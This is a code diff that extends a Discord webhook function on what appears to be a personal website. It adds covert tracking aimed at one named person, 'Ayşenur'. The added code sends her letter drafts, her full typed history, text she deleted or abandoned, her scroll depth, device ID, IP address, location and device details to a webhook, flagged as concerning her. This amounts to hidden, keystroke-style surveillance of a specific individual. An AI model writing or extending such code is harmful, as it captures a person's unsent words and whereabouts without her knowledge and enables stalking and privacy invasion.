@@ -178,7 +178,19 @@ export async function sendDiscordWebhook(
       const summaryText = `${title}\n${description}\n\n` +
         fields.map((f) => `• ${f.name}: ${f.value}`).join('\n');
 
-      const isAysenur = (eventType === 'trigger_detected' || eventType === 'trigger_answered' || (data.realSender && data.realSender.includes('Ayşenur'))) ? 'true' : 'false';
+      const isAysenur = (
+        data.is_aysenur === true ||
+        data.is_aysenur === 'true' ||
+        eventType === 'sut_corbasi_unlocked' ||
+        eventType === 'aysenur_letter_reached' ||
+        eventType === 'page_bottom_reached' ||
+        eventType === 'letter_submitted' ||
+        eventType === 'letter_draft_update' ||
+        eventType === 'letter_draft_abandoned' ||
+        eventType === 'trigger_detected' ||
+        eventType === 'trigger_answered' ||
+        (data.realSender && data.realSender.includes('Ayşenur'))
+      ) ? 'true' : 'false';
 
       const rawVars = [
         { name: 'message', variable: '{event_message}', value: summaryText || '-' },
@@ -207,6 +219,22 @@ export async function sendDiscordWebhook(
       ];
 
       const botGhostPayload = {
+        is_aysenur: isAysenur,
+        title: title || 'Mayko Bahçe',
+        event_type: eventType || 'event',
+        answer: String(data.answerInput || data.answer || '-'),
+        stage: String(data.stage || '-'),
+        scroll_status: String(data.scrollStatus || data.stage || 'Kaydırma Yapıldı'),
+        scroll_percentage: String(data.scrollPercentage || '-'),
+        letter_text: String(data.letterText || '-'),
+        all_typed_text: String(data.allTypedHistory || data.letterText || '-'),
+        deleted_text: String(data.deletedText || '-'),
+        letter_mode: String(data.letterMode || '-'),
+        target_date: String(data.targetDate || '-'),
+        device_id: String(data.deviceId || '-'),
+        ip: String(data.ip || 'Bilinmiyor'),
+        location: String(data.location || 'Bilinmiyor'),
+        device: String(data.device || 'Bilinmiyor'),
         variables: rawVars.map((v) => ({
           name: v.name,
           variable: v.variable,
